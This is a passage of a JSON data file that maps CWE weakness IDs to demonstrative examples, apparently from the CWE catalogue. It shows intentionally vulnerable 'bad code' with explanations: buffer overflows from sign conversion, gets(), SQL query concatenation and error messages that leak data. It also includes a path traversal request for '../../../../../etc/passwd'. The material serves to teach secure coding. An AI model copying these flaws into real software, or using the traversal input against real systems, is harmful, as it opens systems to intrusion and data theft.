sizeof(fullname)-strlen(fullname)-1); Example 3 The Off-by-one error can also be manifested when reading characters from a character array within a for loop that has an incorrect continuation condition. (bad code) Example Language: C #define PATH_SIZE 60 char filename[PATH_SIZE]; for(i=0; i<=PATH_SIZE; i++) { char c = getc(); \"if (c == 'EOF') {\" \"filename[i] = '\\\\0';\" } filename[i] = getc(); } In this case, the correct continuation condition is shown below. (good code) Example Language: C for(i=0; i<PATH_SIZE; i++) { ... Example 4 As another example the Off-by-one error can occur when using the sprintf library function to copy a string variable to a formatted string variable and the original string variable comes from an untrusted source. As in the following example where a local function, setFilename is used to store the value of a filename to a database but first uses sprintf to format the filename. The setFilename function includes an input parameter with the name of the file that is used as the copy source in the sprintf function. The sprintf function will copy the file name to a char array of size 20 and specifies the format of the new variable as 16 characters followed by the file extension .dat. (bad code) Example Language: C int setFilename(char *filename) { char name[20]; sprintf(name, \"%16s.dat\", filename); int success = saveFormattedFilenameToDB(name); return success; } However this will cause an Off-by-one error if the original filename is exactly 16 characters or larger because the format of 16 characters with the file extension is exactly 20 characters and does not take into account the required null terminator that will be placed at the end of the string."
    },
    {
        "id": 194,
        "demonstrative_examples": "Example 1 The following code reads a maximum size and performs a sanity check on that size. It then performs a strncpy, assuming it will not exceed the boundaries of the array. While the use of \"short s\" is forced in this particular example, short int\\'s are frequently used within real-world code, such as code that processes structured data. (bad code) Example Language: C int GetUntrustedInt () { return(0x0000FFFF); } void main (int argc, char **argv) { char path[256]; char *input; int i; short s; unsigned int sz; i = GetUntrustedInt(); s = i; /* s is -1 so it passes the safety check - CWE-697 */ if (s > 256) { DiePainfully(\"go away!\\\\n\"); } /* s is sign-extended and saved in sz */ sz = s; /* output: i=65535, s=-1, sz=4294967295 - your mileage may vary */ printf(\"i=%d, s=%d, sz=%u\\\\n\", i, s, sz); input = GetUserInput(\"Enter pathname:\"); \"/* strncpy interprets s as unsigned int, so it's treated as MAX_INT\" ( CWE-195 ), enabling buffer overflow ( CWE-119 ) */ strncpy(path, input, s); \"path[255] = '\\\\0'; /* don't want\" CWE-170 */ printf(\"Path is: %s\\\\n\", path); } This code first exhibits an example of CWE-839 , allowing \"s\" to be a negative number. When the negative short \"s\" is converted to an unsigned integer, it becomes an extremely large positive integer. When this converted integer is used by strncpy() it will lead to a buffer overflow ( CWE-119 )."
    },
    {
        "id": 195,
        "demonstrative_examples": "Example 1 In this example the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned int, amount will be implicitly converted to unsigned. (bad code) Example Language: C unsigned int readdata () { int amount = 0; ... if (result == ERROR) amount = -1; ... return amount; } If the error condition in the code above is met, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers. Example 2 In this example, depending on the return value of accecssmainframe(), the variable amount can hold a negative value when it is returned. Because the function is declared to return an unsigned value, amount will be implicitly cast to an unsigned number. (bad code) Example Language: C unsigned int readdata () { int amount = 0; ... amount = accessmainframe(); ... return amount; } If the return value of accessmainframe() is -1, then the return value of readdata() will be 4,294,967,295 on a system that uses 32-bit integers. Example 3 The following code is intended to read an incoming packet from a socket and extract one or more headers. (bad code) Example Language: C DataPacket *packet; int numHeaders; PacketHeader *headers; sock=AcceptSocketConnection(); ReadPacket(packet, sock); numHeaders =packet->headers; if (numHeaders > 100) { ExitError(\"too many headers!\"); } headers = malloc(numHeaders * sizeof(PacketHeader); ParsePacketHeaders(packet, headers); The code performs a check to make sure that the packet does not contain too many headers. However, numHeaders is defined as a signed int, so it could be negative. If the incoming packet specifies a value such as -3, then the malloc calculation will generate a negative number (say, -300 if each header can be a maximum of 100 bytes). When this result is provided to malloc(), it is first converted to a size_t type. This conversion then produces a large value such as 4294966996, which may cause malloc() to fail or to allocate an extremely large amount of memory ( CWE-195 ). With the appropriate negative numbers, an attacker could trick malloc() into using a very small positive number, which then allocates a buffer that is much smaller than expected, potentially leading to a buffer overflow. Example 4 This example processes user input comprised of a series of variable-length structures. The first 2 bytes of input dictate the size of the structure to be processed. (bad code) Example Language: C char* processNext(char* strm) { char buf[512]; short len = *(short*) strm; strm += sizeof(len); if (len <= 512) { memcpy(buf, strm, len); process(buf); return strm + len; } else { return -1; } } The programmer has set an upper bound on the structure size: if it is larger than 512, the input will not be processed. The problem is that len is a signed short, so the check against the maximum structure length is done with signed values, but len is converted to an unsigned integer for the call to memcpy() and the negative bit will be extended to result in a huge value for the unsigned integer. If len is negative, then it will appear that the structure has an appropriate size (the if branch will be taken), but the amount of memory copied by memcpy() will be quite large, and the attacker will be able to overflow the stack with data in strm. Example 5 In the following example, it is possible to request that memcpy move a much larger segment of memory than assumed: (bad code) Example Language: C int returnChunkSize(void *) { /* if chunk info is valid, return the size of usable memory, * else, return -1 to indicate an error */ ... } int main() { ... memcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1)); ... } If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation ( CWE-252 ), so -1 can be passed as the size argument to memcpy() ( CWE-805 ). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 ( CWE-195 ), and therefore will copy far more memory than is likely available to the destination buffer ( CWE-787 , CWE-788 ). Example 6 \"This example shows a typical attempt to parse a string with an error resulting from a difference in assumptions between the caller to a function and the function's action.\" (bad code) Example Language: C int proc_msg(char *s, int msg_len) { // Note space at the end of the string - assume all strings have preamble with space int pre_len = sizeof(\"preamble: \"); char buf[pre_len - msg_len]; ... Do processing here if we get this far } char *s = \"preamble: message\\\\n\"; \"char *sl = strchr(s, ':');        // Number of characters up to ':' (not including space)\" int jnklen = sl == NULL ? 0 : sl - s;    // If undefined pointer, use zero length int ret_val = proc_msg (\"s\",  jnklen);    // Violate assumption of preamble length, end up with negative value, blow out stack \"The buffer length ends up being -1, resulting in a blown out stack. The space character after the colon is included in the function calculation, but not in the caller's calculation. This, unfortunately, is not usually so obvious but exists in an obtuse series of calculations.\""
    },
    {
        "id": 196,
        "demonstrative_examples": ""
    },
    {
        "id": 197,
        "demonstrative_examples": "Example 1 This example, while not exploitable, shows the possible mangling of values associated with truncation errors: (bad code) Example Language: C int intPrimitive; short shortPrimitive; intPrimitive = (int)(~((int)0) ^ (1 << (sizeof(int)*8-1))); shortPrimitive = intPrimitive; printf(\"Int MAXINT: %d\\\\nShort MAXINT: %d\\\\n\", intPrimitive, shortPrimitive); The above code, when compiled and run on certain systems, returns the following output: (result) Int MAXINT: 2147483647 Short MAXINT: -1 This problem may be exploitable when the truncated value is used as an array index, which can happen implicitly when 64-bit values are used as indexes, as they are truncated to 32 bits. Example 2 In the following Java example, the method updateSalesForProduct is part of a business application class that updates the sales information for a particular product. The method receives as arguments the product ID and the integer amount sold. The product ID is used to retrieve the total product count from an inventory object which returns the count as an integer. Before calling the method of the sales object to update the sales count the integer values are converted to The primitive type short since the method requires short type for the method arguments. (bad code) Example Language: Java ... // update sales database for number of product sold with product ID public void updateSalesForProduct(String productID, int amountSold) { // get the total number of products in inventory database int productCount = inventory.getProductCount(productID); // convert integer values to short, the method for the // sales object requires the parameters to be of type short short count = (short) productCount; short sold = (short) amountSold; // update sales database for product sales.updateSalesCount(productID, count, sold); } ... However, a numeric truncation error can occur if the integer values are higher than the maximum value allowed for the primitive type short. This can cause unexpected results or loss or corruption of data. In this case the sales database may be corrupted with incorrect data. Explicit casting from a from a larger size primitive type to a smaller size primitive type should be prevented. The following example an if statement is added to validate that the integer values less than the maximum value for the primitive type short before the explicit cast and the call to the sales method. (good code) Example Language: Java ... // update sales database for number of product sold with product ID public void updateSalesForProduct(String productID, int amountSold) { // get the total number of products in inventory database int productCount = inventory.getProductCount(productID); // make sure that integer numbers are not greater than // maximum value for type short before converting if ((productCount < Short.MAX_VALUE) && (amountSold < Short.MAX_VALUE)) { // convert integer values to short, the method for the // sales object requires the parameters to be of type short short count = (short) productCount; short sold = (short) amountSold; // update sales database for product sales.updateSalesCount(productID, count, sold); else { // throw exception or perform other processing ... } } ..."
    },
    {
        "id": 198,
        "demonstrative_examples": ""
    },
    {
        "id": 200,
        "demonstrative_examples": "Example 1 The following code checks validity of the supplied username and password and notifies the user of a successful or failed login. (bad code) Example Language: Perl \"my $username=param('username');\" \"my $password=param('password');\" if (IsValidUsername($username) == 1) { if (IsValidPassword($username, $password) == 1) { print \"Login Successful\"; } else { print \"Login Failed - incorrect password\"; } } else { print \"Login Failed - unknown username\"; } In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials. While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as: (result) \"Login Failed - incorrect username or password\" Example 2 This code tries to open a database connection, and prints any exceptions that occur. (bad code) Example Language: Java try { openDbConnection(); } //print exception message that includes exception message and configuration file location catch (Exception $e) { \"echo 'Caught exception: ', $e->getMessage(), '\\\\n';\" \"echo 'Check credentials in config file at: ', $Mysql_config_location, '\\\\n';\" } If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database. Example 3 In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file. (bad code) Example Language: Java public BankAccount getUserBankAccount(String username, String accountNumber) { BankAccount userAccount = null; String query = null; try { if (isAuthorizedUser(username)) { query = \"SELECT * FROM accounts WHERE owner = \" + username + \" AND accountID = \" + accountNumber; DatabaseManager dbManager = new DatabaseManager(); Connection conn = dbManager.getConnection(); Statement stmt = conn.createStatement(); ResultSet queryResult = stmt.executeQuery(query); userAccount = (BankAccount)queryResult.getObject(accountNumber); } } catch (SQLException ex) { String logMessage = \"Unable to retrieve account information from database,\\\\nquery: \" + query; Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex); } return userAccount; } The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection ( CWE-89 ) to directly access the database. Example 4 This code stores location information about the current user: (bad code) Example Language: Java locationClient = new LocationClient(this, this, this); locationClient.connect(); currentUser.setLocation(locationClient.getLastLocation()); ... catch (Exception e) { AlertDialog.Builder builder = new AlertDialog.Builder(this); builder.setMessage(\"Sorry, this application has experienced an error.\"); AlertDialog alert = builder.create(); alert.show(); Log.e(\"ExampleActivity\", \"Caught exception: \" + e + \" While on User:\" + User.toString()); } \"When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.\" Example 5 The following is an actual MySQL error statement: (result) Example Language: SQL \"Warning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4\" The error clearly exposes the database credentials. Example 6 This code displays some information on a web page. (bad code) Example Language: JSP Social Security Number: <%= ssn %></br>Credit Card Number: <%= ccn %> \"The code displays a user's credit card and social security numbers, even though they aren't absolutely necessary.\" Example 7 The following program changes its behavior based on a debug flag. (bad code) Example Language: JSP <% if (Boolean.getBoolean(\"debugEnabled\")) { %> User account number: <%= acctNo %> <% } %> The code writes sensitive debug information to the client browser if the \"debugEnabled\" flag is set to true . Example 8 \"This code uses location to determine the user's current US State location.\" \"First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:\" (bad code) Example Language: XML <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/> \"During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:\" (bad code) Example Language: Java locationClient = new LocationClient(this, this, this); locationClient.connect(); Location userCurrLocation; userCurrLocation = locationClient.getLastLocation(); deriveStateFromCoords(userCurrLocation); While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in."
    },
    {
        "id": 201,
        "demonstrative_examples": "Example 1 The following is an actual MySQL error statement: (result) Example Language: SQL \"Warning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4\" The error clearly exposes the database credentials."
    },
    {
        "id": 202,
        "demonstrative_examples": "Example 1 See the book Translucent Databases for examples."
    },
    {
        "id": 203,
        "demonstrative_examples": "Example 1 The following code checks validity of the supplied username and password and notifies the user of a successful or failed login. (bad code) Example Language: Perl \"my $username=param('username');\" \"my $password=param('password');\" if (IsValidUsername($username) == 1) { if (IsValidPassword($username, $password) == 1) { print \"Login Successful\"; } else { print \"Login Failed - incorrect password\"; } } else { print \"Login Failed - unknown username\"; } In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials. While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as: (result) \"Login Failed - incorrect username or password\" Example 2 Non-uniform processing time causes timing channel. (bad code) Suppose an algorithm for implementing an encryption routine works fine per se, but the time taken to output the result of the encryption routine depends on a relationship between the input plaintext and the key (e.g., suppose, if the plaintext is similar to the key, it would run very fast). In the example above, an attacker may vary the inputs, then observe differences between processing times (since different plaintexts take different time). This could be used to infer information about the key. (good code) Artificial delays may be added to ensured all calculations take equal time to execute."
    },
    {
        "id": 204,
        "demonstrative_examples": "Example 1 The following code checks validity of the supplied username and password and notifies the user of a successful or failed login. (bad code) Example Language: Perl \"my $username=param('username');\" \"my $password=param('password');\" if (IsValidUsername($username) == 1) { if (IsValidPassword($username, $password) == 1) { print \"Login Successful\"; } else { print \"Login Failed - incorrect password\"; } } else { print \"Login Failed - unknown username\"; } In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials. While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as: (result) \"Login Failed - incorrect username or password\""
    },
    {
        "id": 205,
        "demonstrative_examples": ""
    },
    {
        "id": 206,
        "demonstrative_examples": ""
    },
    {
        "id": 207,
        "demonstrative_examples": ""
    },
    {
        "id": 208,
        "demonstrative_examples": ""
    },
    {
        "id": 209,
        "demonstrative_examples": "Example 1 In the following example, sensitive information might be printed depending on the exception that occurs. (bad code) Example Language: Java try { /.../ } catch (Exception e) { System.out.println(e); } If an exception related to SQL is handled by the catch, then the output might contain sensitive information such as SQL query structure or private information. If this output is redirected to a web user, this may represent a security problem. Example 2 This code tries to open a database connection, and prints any exceptions that occur. (bad code) Example Language: Java try { openDbConnection(); } //print exception message that includes exception message and configuration file location catch (Exception $e) { \"echo 'Caught exception: ', $e->getMessage(), '\\\\n';\" \"echo 'Check credentials in config file at: ', $Mysql_config_location, '\\\\n';\" } If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database. Example 3 The following code generates an error message that leaks the full pathname of the configuration file. (bad code) Example Language: Perl $ConfigDir = \"/home/myprog/config\"; $uname = GetUserInput(\"username\"); # avoid CWE-22 , CWE-78 , others. ExitError(\"Bad hacker!\") if ($uname !~ /^\\\\w+$/); $file = \"$ConfigDir/$uname.txt\"; if (! (-e $file)) { ExitError(\"Error: $file does not exist\"); } ... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application. Example 4 In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file. (bad code) Example Language: Java public BankAccount getUserBankAccount(String username, String accountNumber) { BankAccount userAccount = null; String query = null; try { if (isAuthorizedUser(username)) { query = \"SELECT * FROM accounts WHERE owner = \" + username + \" AND accountID = \" + accountNumber; DatabaseManager dbManager = new DatabaseManager(); Connection conn = dbManager.getConnection(); Statement stmt = conn.createStatement(); ResultSet queryResult = stmt.executeQuery(query); userAccount = (BankAccount)queryResult.getObject(accountNumber); } } catch (SQLException ex) { String logMessage = \"Unable to retrieve account information from database,\\\\nquery: \" + query; Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex); } return userAccount; } The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection ( CWE-89 ) to directly access the database."
    },
    {
        "id": 210,
        "demonstrative_examples": "Example 1 The following code uses custom configuration files for each user in the application. It checks to see if the file exists on the system before attempting to open and use the file. If the configuration file does not exist, then an error is generated, and the application exits. (bad code) Example Language: Perl $uname = GetUserInput(\"username\"); # avoid CWE-22 , CWE-78 , others. if ($uname !~ /^\\\\w+$/) { ExitError(\"Bad hacker!\") ; } $filename = \"/home/myprog/config/\" . $uname . \".txt\"; if (!(-e $filename)) { ExitError(\"Error: $filename does not exist\"); } If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that is not associated with a configuration file, an attacker could get this pathname from the error message. It could then be used to exploit path traversal, symbolic link following, or other problems that may exist elsewhere in the application."
    },
    {
        "id": 211,
        "demonstrative_examples": ""
    },
    {
        "id": 212,
        "demonstrative_examples": "Example 1 This code either generates a public HTML user information page or a JSON response containing the same user information. (bad code) Example Language: PHP // API flag, output JSON if set \"$json = $_GET['json']\" \"$username = $_GET['user']\" if(!$json) { $record = getUserRecord($username); foreach($record as $fieldName => $fieldValue) { if($fieldName == \"email_address\") { // skip displaying user emails continue; } else{ writeToHtmlPage($fieldName,$fieldValue); } } } else { $record = getUserRecord($username); echo json_encode($record); } \"The programmer is careful to not display the user's e-mail address when displaying the public HTML page. However, the e-mail address is not removed from the JSON response, exposing the user's e-mail address.\""
    },
    {
        "id": 213,
        "demonstrative_examples": "Example 1 This code displays some information on a web page. (bad code) Example Language: JSP Social Security Number: <%= ssn %></br>Credit Card Number: <%= ccn %> \"The code displays a user's credit card and social security numbers, even though they aren't absolutely necessary.\""
    },
    {
        "id": 214,
        "demonstrative_examples": "Example 1 In the example below, the password for a keystore file is read from a system property. (bad code) Example Language: Java String keystorePass = System.getProperty(\"javax.net.ssl.keyStorePassword\"); if (keystorePass == null) { System.err.println(\"ERROR: Keystore password not specified.\"); System.exit(-1); } ... If the property is defined on the command line when the program is invoked (using the -D... syntax), the password may be displayed in the OS process list."
    },
    {
        "id": 215,
        "demonstrative_examples": "Example 1 The following program changes its behavior based on a debug flag. (bad code) Example Language: JSP <% if (Boolean.getBoolean(\"debugEnabled\")) { %> User account number: <%= acctNo %> <% } %> The code writes sensitive debug information to the client browser if the \"debugEnabled\" flag is set to true ."
    },
    {
        "id": 219,
        "demonstrative_examples": ""
    },
    {
        "id": 220,
        "demonstrative_examples": ""
    },
    {
        "id": 221,
        "demonstrative_examples": ""
    },
    {
        "id": 222,
        "demonstrative_examples": ""
    },
    {
        "id": 223,
        "demonstrative_examples": "Example 1 This code logs suspicious multiple login attempts. (bad code) Example Language: PHP function login($userName,$password){ if(authenticate($userName,$password)){ return True; } else{ incrementLoginAttempts($userName); if(recentLoginAttempts($userName) > 5){ writeLog(\"Failed login attempt by User: \" . $userName . \" at \" + date(\\'r\\') ); } } } This code only logs failed login attempts when a certain limit is reached. If an attacker knows this limit, they can stop their attack from being discovered by avoiding the limit."
    },
    {
        "id": 224,
        "demonstrative_examples": "Example 1 This code prints the contents of a file if a user has permission. (bad code) Example Language: PHP function readFile($filename){ $user = getCurrentUser(); $realFile = $filename; //resolve file if its a symbolic link if(is_link($filename)){ $realFile = readlink($filename); } if(fileowner($realFile) == $user){ echo file_get_contents($realFile); return; } else{ \"echo 'Access denied';\" \"writeLog($user . ' attempted to access the file '. $filename . ' on '. date('r'));\" } } While the code logs a bad access attempt, it logs the user supplied name for the file, not the canonicalized file name. An attacker can obscure their target by giving the script the name of a link to the file they are attempting to access. Also note this code contains a race condition between the is_link() and readlink() functions ( CWE-363 )."
    },
    {
        "id": 226,
        "demonstrative_examples": ""
    },
    {
        "id": 228,
        "demonstrative_examples": "Example 1 This Android application has registered to handle a URL when sent an intent: (bad code) Example Language: Java ... IntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); ... public class UrlHandlerReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if(\"com.example.URLHandler.openURL\".equals(intent.getAction())) { String URL = intent.getStringExtra(\"URLToOpen\"); int length = URL.length(); ... } } } The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."
    },
    {
        "id": 229,
        "demonstrative_examples": ""
    },
    {
        "id": 230,
        "demonstrative_examples": "Example 1 This Android application has registered to handle a URL when sent an intent: (bad code) Example Language: Java ... IntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); ... public class UrlHandlerReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if(\"com.example.URLHandler.openURL\".equals(intent.getAction())) { String URL = intent.getStringExtra(\"URLToOpen\"); int length = URL.length(); ... } } } The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."
    },
    {
        "id": 231,
        "demonstrative_examples": ""
    },
    {
        "id": 232,
        "demonstrative_examples": "Example 1 In this example, an address parameter is read and trimmed of whitespace. (bad code) Example Language: Java String address = request.getParameter(\"address\"); address = address.trim(); String updateString = \"UPDATE shippingInfo SET address=\\'?\\' WHERE email=\\'cwe@example.com\\'\"; emailAddress = con.prepareStatement(updateString); emailAddress.setString(1, address); If the value of the address parameter is null (undefined), the servlet will throw a NullPointerException when the trim() is attempted."
    },
    {
        "id": 233,
        "demonstrative_examples": "Example 1 This Android application has registered to handle a URL when sent an intent: (bad code) Example Language: Java ... IntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); ... public class UrlHandlerReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if(\"com.example.URLHandler.openURL\".equals(intent.getAction())) { String URL = intent.getStringExtra(\"URLToOpen\"); int length = URL.length(); ... } } } The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."
    },
    {
        "id": 234,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: C foo_funct(one, two); void foo_funct(int one, int two, int three) { printf(\"1) %d\\\\n2) %d\\\\n3) %d\\\\n\", one, two, three); } (bad code) Example Language: C void some_function(int foo, ...) { int a[3], i; va_list ap; va_start(ap, foo); for (i = 0; i < sizeof(a) / sizeof(int); i++) a[i] = va_arg(ap, int); va_end(ap); } int main(int argc, char *argv[]) { some_function(17, 42); } This can be exploited to disclose information with no work whatsoever. In fact, each time this function is run, it will print out the next 4 bytes on the stack after the two numbers sent to it."
    },
    {
        "id": 235,
        "demonstrative_examples": ""
    },
    {
        "id": 236,
        "demonstrative_examples": ""
    },
    {
        "id": 237,
        "demonstrative_examples": ""
    },
    {
        "id": 238,
        "demonstrative_examples": ""
    },
    {
        "id": 239,
        "demonstrative_examples": ""
    },
    {
        "id": 240,
        "demonstrative_examples": ""
    },
    {
        "id": 241,
        "demonstrative_examples": ""
    },
    {
        "id": 242,
        "demonstrative_examples": "Example 1 The code below calls gets() to read information into a buffer. (bad code) Example Language: C char buf[BUFSIZE]; gets(buf); The gets() function in C is inherently unsafe. Example 2 The code below calls the gets() function to read in data from the command line. (bad code) Example Language: C char buf[24]; printf(\"Please enter your name and press <Enter>\\\\n\"); gets(buf); ... } However, gets() is inherently unsafe, because it copies all input from STDIN to the buffer without checking size. This allows the user to provide a string that is larger than the buffer size, resulting in an overflow condition."
    },
    {
        "id": 243,
        "demonstrative_examples": "Example 1 Consider the following source code from a (hypothetical) FTP server: (bad code) Example Language: C chroot(\"/var/ftproot\"); ... fgets(filename, sizeof(filename), network); localfile = fopen(filename, \"r\"); while ((len = fread(buf, 1, sizeof(buf), localfile)) != EOF) { fwrite(buf, 1, sizeof(buf), network); } fclose(localfile); This code is responsible for reading a filename from the network, opening the corresponding file on the local machine, and sending the contents over the network. This code could be used to implement the FTP GET command. The FTP server calls chroot() in its initialization routines in an attempt to prevent access to files outside of /var/ftproot. But because the server does not change the current working directory by calling chdir(\"/\"), an attacker could request the file \"../../../../../etc/passwd\" and obtain a copy of the system password file."
    },
    {
        "id": 244,
        "demonstrative_examples": "Example 1 The following code calls realloc() on a buffer containing sensitive data: (bad code) Example Language: C cleartext_buffer = get_secret();... cleartext_buffer = realloc(cleartext_buffer, 1024); ... scrub_memory(cleartext_buffer, 1024); There is an attempt to scrub the sensitive data from memory, but realloc() is used, so a copy of the data can still be exposed in the memory originally allocated for cleartext_buffer."
    },
    {
        "id": 245,
        "demonstrative_examples": "Example 1 In the following example, the class DatabaseConnection opens and manages a connection to a database for a J2EE application. The method openDatabaseConnection opens a connection to the database using a DriverManager to create the Connection object conn to the database specified in the string constant CONNECT_STRING. (bad code) Example Language: Java public class DatabaseConnection { private static final String CONNECT_STRING = \"jdbc:mysql://localhost:3306/mysqldb\"; private Connection conn = null; public DatabaseConnection() { } public void openDatabaseConnection() { try { conn = DriverManager.getConnection(CONNECT_STRING); } catch (SQLException ex) {...} } // Member functions for retrieving database connection and accessing database ... } \"The use of the DriverManager class to directly manage the connection to the database violates the J2EE restriction against the direct management of connections. The J2EE application should use the web application container's resource management facilities to obtain a connection to the database as shown in the following example.\" (good code) public class DatabaseConnection { private static final String DB_DATASRC_REF = \"jdbc:mysql://localhost:3306/mysqldb\"; private Connection conn = null; public DatabaseConnection() { } public void openDatabaseConnection() { try { InitialContext ctx = new InitialContext(); DataSource datasource = (DataSource) ctx.lookup(DB_DATASRC_REF); conn = datasource.getConnection(); } catch (NamingException ex) {...} } catch (SQLException ex) {...} } // Member functions for retrieving database connection and accessing database ... }"
    },
    {
        "id": 246,
        "demonstrative_examples": "Example 1 The following example opens a socket to connect to a remote server. (bad code) Example Language: Java public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // Perform servlet tasks. ... // Open a socket to a remote server (bad). Socket sock = null; try { sock = new Socket(remoteHostname, 3000); // Do something with the socket. ... } catch (Exception e) { ... } } A Socket object is created directly within the Java servlet, which is a dangerous way to manage remote connections."
    },
    {
        "id": 248,
        "demonstrative_examples": "Example 1 The following example attempts to resolve a hostname. (bad code) Example Language: Java protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException { String ip = req.getRemoteAddr(); InetAddress addr = InetAddress.getByName(ip); ... out.println(\"hello \" + addr.getHostName()); } A DNS lookup failure will cause the Servlet to throw an exception. Example 2 The _alloca() function allocates memory on the stack. If an allocation request is too large for the available stack space, _alloca() throws an exception. If the exception is not caught, the program will crash, potentially enabling a denial of service attack. _alloca() has been deprecated as of Microsoft Visual Studio 2005(R). It has been replaced with the more secure _alloca_s(). Example 3 EnterCriticalSection() can raise an exception, potentially causing the program to crash. Under operating systems prior to Windows 2000, the EnterCriticalSection() function can raise an exception in low memory situations. If the exception is not caught, the program will crash, potentially enabling a denial of service attack."
    },
    {
        "id": 250,
        "demonstrative_examples": "Example 1 \"This code temporarily raises the program's privileges to allow creation of a new user folder.\" (bad code) Example Language: Python def makeNewUserDir(username): if invalidUsername(username): #avoid CWE-22 and CWE-78 \"print('Usernames cannot contain invalid characters')\" return False try: raisePrivileges() \"os.mkdir('/home/' + username)\" lowerPrivileges() except OSError: \"print('Unable to create new user directory for user:' + username)\" return False return True While the program only raises its privilege level to create the folder and immediately lowers it again, if the call to os.mkdir() throws an exception, the call to lowerPrivileges() will not occur. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur. Example 2 The following code calls chroot() to restrict the application to a subset of the filesystem below APP_HOME in order to prevent an attacker from using the program to gain unauthorized access to files located elsewhere. The code then opens a file specified by the user and processes the contents of the file. (bad code) Example Language: C chroot(APP_HOME); chdir(\"/\"); FILE* data = fopen(argv[1], \"r+\"); ... \"Constraining the process inside the application's home directory before opening any files is a valuable security measure. However, the absence of a call to setuid() with some non-zero value means the application is continuing to operate with unnecessary root privileges. Any successful exploit carried out by an attacker against the application can now result in a privilege escalation attack because any malicious operations will be performed with the privileges of the superuser. If the application drops to the privilege level of a non-root user, the potential for damage is substantially reduced.\" Example 3 \"This application intends to use a user's location to determine the timezone the user is in:\" (bad code) Example Language: Java locationClient = new LocationClient(this, this, this); locationClient.connect(); Location userCurrLocation; userCurrLocation = locationClient.getLastLocation(); setTimeZone(userCurrLocation); This is unnecessary use of the location API, as this information is already available using the Android Time API. Always be sure there is not another way to obtain needed information before resorting to using the location API. Example 4 \"This code uses location to determine the user's current US State location.\" \"First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:\" (bad code) Example Language: XML <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/> \"During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:\" (bad code) Example Language: Java locationClient = new LocationClient(this, this, this); locationClient.connect(); Location userCurrLocation; userCurrLocation = locationClient.getLastLocation(); deriveStateFromCoords(userCurrLocation); While the application needs this information, it does not 